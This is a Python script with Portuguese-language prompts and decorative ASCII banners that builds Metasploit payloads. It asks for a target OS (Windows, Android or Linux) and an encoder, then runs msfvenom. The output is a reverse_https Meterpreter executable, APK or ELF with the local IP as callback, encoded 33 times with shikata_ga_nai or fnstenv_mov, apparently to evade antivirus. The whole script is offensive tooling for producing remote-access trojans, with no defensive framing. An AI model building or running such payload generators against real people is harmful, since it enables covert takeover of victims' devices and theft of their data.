from termcolor import colored
import os
import subprocess
import re
import random
import platform

def ban_1():
   print(colored(r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⠶⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣾⠛⠋⠁⠀⠀⠉⠙⢻⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⡀⠀⠀⠀⠀⠀⣀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠟⠋⠁⣿⡀⠀⠀⠀⢀⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣴⣾⣶⣶⣾⡟⠿⣦⡀⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢿⣿⠟⠉⠀⠀⠀⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣧⡀⠀⠀⢀⣴⣿⠿⠛⠛⠋⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⣴⣿⣿⣿⣦⣄⡀⠠⢴⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣦⣄⠘⣷⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""", 'yellow', '', ['bold']))
   

def ban_die():
   print(colored(r"""
           ▄▄▄▄
        ▄██████     ▄▄▄█▄
       ▄██▀░░▀██▄    ████████▄
      ███░░░░░░██      █▀▀▀▀▀██▄▄
     ▄██▌░░░░░░░██    ▐▌        ▀█▄
     ███░░▐█░█▌░██    █▌          ▀▌
    ████░▐█▌░▐█▌██   ██
   ▐████░▐░░░░░▌██   █▌
    ████░░░▄█░░░██  ▐█
    ████░░░██░░██▌  █▌
    ████▌░▐█░░███   █
    ▐████░░▌░███   ██
     ████░░░███    █▌
   ██████▌░████   ██
 ▐████████████  ███
 █████████████▄████
██████████████████
██████████████████
█████████████████▀
█████████████████
████████████████
████████████████

""", 'blue', '', ['bold']))
   

def ban_heart():
    print(colored(r"""
────(♥)(♥)(♥)────(♥)(♥)(♥) __ ɪƒ ƴσυ'ʀє αʟσηє,
──(♥)██████(♥)(♥)██████(♥) ɪ'ʟʟ ɓє ƴσυʀ ѕɧα∂σѡ.
─(♥)████████(♥)████████(♥) ɪƒ ƴσυ ѡαηт тσ cʀƴ,
─(♥)██████████████████(♥) ɪ'ʟʟ ɓє ƴσυʀ ѕɧσυʟ∂єʀ.
──(♥)████████████████(♥) ɪƒ ƴσυ ѡαηт α ɧυɢ,
────(♥)████████████(♥) __ ɪ'ʟʟ ɓє ƴσυʀ ρɪʟʟσѡ.
──────(♥)████████(♥) ɪƒ ƴσυ ηєє∂ тσ ɓє ɧαρρƴ,
────────(♥)████(♥) __ ɪ'ʟʟ ɓє ƴσυʀ ѕɱɪʟє.
─────────(♥)██(♥) ɓυт αηƴтɪɱє ƴσυ ηєє∂ α ƒʀɪєη∂,
───────────(♥) __ ɪ'ʟʟ ʝυѕт ɓє ɱє.

""", 'red', '', ['bold']))
    
def ban_baus():
   print(colored(r"""

""", 'magenta', '', ['bold']))

popt = r"""
   [1] Windows
   [2] Android
   [3] Linux
   
   [#] Escolha uma OS alvo:  """
   
eopt = r"""


   [1] FNTENV & MOV
   [2] shikata
   [0] Nenhum
   
   [#] Escolha uma encoder:  """

def get_ip():
    system = platform.system().lower()
    if system == 'windows':
        try:
            # Executa o comando "ipconfig" no Windows e obtém a saída
            output = subprocess.check_output(["ipconfig"])
            output = output.decode("utf-8")
            
            # Procura o endereço IP na saída usando uma expressão regular
            ip_pattern = r"IPv4 Address[^\d]+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
            ip_match = re.search(ip_pattern, output)
            
            if ip_match:
                return ip_match.group(1)
            else:
                return "Endereço IP não encontrado no Windows."
        except subprocess.CalledProcessError:
            return "Erro ao executar o comando 'ipconfig' no Windows."
    elif system == 'linux' or system == 'darwin':
        try:
            # Executa o comando "ifconfig" no Linux ou macOS e obtém a saída
            output = subprocess.check_output(["ifconfig"])
            output = output.decode("utf-8")
            
            # Procura o endereço IP na saída usando uma expressão regular
            ip_pattern = r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
            ip_match = re.search(ip_pattern, output)
            
            if ip_match:
                return ip_match.group(1)
            else:
                return "Endereço IP não encontrado no Linux ou macOS."
        except subprocess.CalledProcessError:
            return "Erro ao executar o comando 'ifconfig' no Linux ou macOS."
    else:
        return "Sistema operacional não suportado."




def getos():
    system = platform.system().lower()
    
    if system == 'windows':
        return 'win'
    elif system == 'linux':
        return 'lin'
    else:
        return 'unk'

def screen():
   os.system('clear')


def main():
    screen()

    screen()

    banner = str(random.randint(1, 3))

    if banner == '1':
        ban_1()
        color = 'yellow'
    elif banner == '2':
        ban_die()
        color = 'blue'
    elif banner == '3':
        ban_heart()
        color = 'red'

    print(colored(r"""   [#] Para usar essa ferramenta, é necessario instalar o Metasploit Framework""", color, '', ['bold']))

    payload = input(colored(popt, color, '', ['bold']))
    encoder = input(colored(eopt, color, '', ['bold']))
    name = input(colored('\n   Insert payload name without extension: ', color, '', ['bold']))
    ip = get_ip()
    port = input(colored('\n   Insert LPORT: ', color, '', ['bold']))

    if payload == "1" and encoder == "1":
        comma = f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/fnstenv_mov -i 33 -f exe > {name}.exe --smallest"
    elif payload == "1" and encoder == "2":
        comma = f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 33 -f exe > {name}.exe --smallest"
    elif payload == "1" and encoder == "0":
        comma = f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -i 33 -f exe > {name}.exe --smallest"
    elif payload == "2" and encoder == "1":
        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/fnstenv_mov -i 33 -f raw > {name}.apk --smallest"
    elif payload == "2" and encoder == "2":
        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 33 -f raw > {name}.apk --smallest"
    elif payload == "2" and encoder == "0":
        comma = f"msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -i 33 -f raw > {name}.apk --smallest"
    elif payload == "3" and encoder == "1":
        comma = f"msfvenom -p linux/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/fnstenv_mov -i 33 -f elf > {name}.elf --smallest"
    elif payload == "3" and encoder == "2":
        comma = f"msfvenom -p linux/meterpreter/reverse_https LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 33 -f elf > {name}.elf --smallest"
    elif payload == "3" and encoder == "0":
        comma = f"msfvenom -p linux/meterpreter/reverse_https LHOST={ip} LPORT={port} -i 33 -f elf > {name}.elf --smallest"

    process = subprocess.Popen(comma, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode == 0:
        print(colored("Payload criado com sucesso!", 'green'))
    else:
        print(colored(f"Erro ao criar o payload. Saída de erro:\n{stderr.decode()}", 'red'))


main()

